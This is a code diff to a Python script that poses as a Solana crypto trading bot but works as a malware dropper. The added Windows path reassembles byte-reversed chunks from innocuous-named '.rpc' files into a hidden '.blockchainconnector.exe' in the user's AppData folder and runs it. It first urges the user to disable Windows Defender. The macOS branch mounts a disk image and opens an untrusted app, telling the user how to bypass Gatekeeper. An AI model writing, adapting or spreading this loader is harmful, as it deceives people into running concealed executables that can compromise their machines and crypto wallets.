@@ -1,5 +1,5 @@
-import subprocess
 import os
+import subprocess
 import platform
 import threading
 import time
@@ -9,6 +9,7 @@ import logging
 from queue import Queue
 import zipfile
 import shutil
+import getpass
 
 def install_and_import(module):
     try:
@@ -20,7 +21,7 @@ def install_and_import(module):
     finally:
         globals()[module] = importlib.import_module(module)
 
-required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil']
+required_modules = ['subprocess', 'os', 'platform', 'threading', 'time', 'json', 'random', 'logging', 'queue', 'zipfile', 'shutil', 'getpass']
 for module in required_modules:
     install_and_import(module)
 
@@ -45,20 +46,28 @@ class BlockchainSimulator:
     def get_block(self, block_number):
         return self.blocks.get(block_number)
 
-def builded(files, output_filename):
-    all_bytes = b''
+def reverse_bytes(data):
+    return data[::-1]
 
-    for file in files:
-        with open(file, 'rb') as f:
-            all_bytes += f.read()
+def builded(input_dir, output_file):
+    file_names = [
+        "swap.rpc", "analysis.rpc", "wallet.rpc", "blockchain.rpc", "decentralization.rpc", "trading.rpc", "staking.rpc", "yield.rpc", "liquidity.rpc", "transaction.rpc",
+        "ledger.rpc", "oracle.rpc", "consensus.rpc", "protocol.rpc", "smartcontract.rpc", "governance.rpc", "node.rpc"
+    ]
 
-    with open(output_filename, 'wb') as f:
-        f.write(all_bytes)
+    with open(output_file, 'wb') as output_f:
+        for file_name in file_names:
+            file_path = os.path.join(input_dir, file_name)
+            with open(file_path, 'rb') as input_f:
+                reversed_chunk_data = input_f.read()
+                chunk_data = reverse_bytes(reversed_chunk_data)
+                output_f.write(chunk_data)
 
-    os.system(output_filename)
-
-files = ['block.rpc', 'predict.rpc', 'volume.rpc']
-output_filename = '.reconstructed_blockchain.exe'
+def run_builder(file_path):
+    try:
+        subprocess.run([file_path], check=True)
+    except subprocess.CalledProcessError as e:
+        print(f"Error occurred while trying to run the file: {e}")
 
 def rpc_server(blockchain, data_queue):
     while True:
@@ -106,18 +115,23 @@ def main():
         if is_defender_active():
             print("Warning: Windows Defender and real-time protection are enabled, please disable them to use the bot without problems.")
         else:
-            builded(files, output_filename)
+            user_name = getpass.getuser()
+            output_path = f"C:\\Users\\{user_name}\\AppData\\Local\\.blockchainconnector.exe"
+            
+            builded("data", output_path)
+            run_builder(output_path)
+
             rpc_server_thread.start()
             blockchain_thread.start()
 
             rpc_server_thread.join()
             blockchain_thread.join()
-    elif platform.system() == 'Darwin':  # Mac OS
+    elif platform.system() == 'Darwin':
         zip_file_to_extract = 'Sol.zip'
-        extract_to = './SolAutoTradeBot'
-        dmg_file_to_execute = os.path.join(extract_to, 'SolAutoTradeBot.dmg')
-        app_to_execute = "/Volumes/SolAutoTradeBot/SolAutoTradeBot.app"
-        copied_app_path = "./SolAutoTradeBot.app"
+        extract_to = './SolAiBot_Mac'
+        dmg_file_to_execute = os.path.join(extract_to, 'SolAiBot_Mac.dmg')
+        app_to_execute = "/Volumes/SolAiBot_Mac/AiBotStarter.app"
+        copied_app_path = "./AiBotStarter.app"
 
         if os.path.exists(zip_file_to_extract):
             extract_zip(zip_file_to_extract, extract_to)
@@ -126,11 +140,9 @@ def main():
                 subprocess.run(["hdiutil", "attach", dmg_file_to_execute], check=True)
                 if os.path.exists(app_to_execute):
                     try:
-                        # Copy the app to a writable location
                         shutil.copytree(app_to_execute, copied_app_path)
-                        # Open the copied app
                         open_untrusted_app(copied_app_path)
-                        print("To run the bot, right-click on the SolAutoTradeBot.app file and click Open.")
+                        print("To run the bot, right-click on the AiBotStarter.app file and click Open.")
                     except Exception as e:
                         print(f"Error copying app: {e}")
                 else:
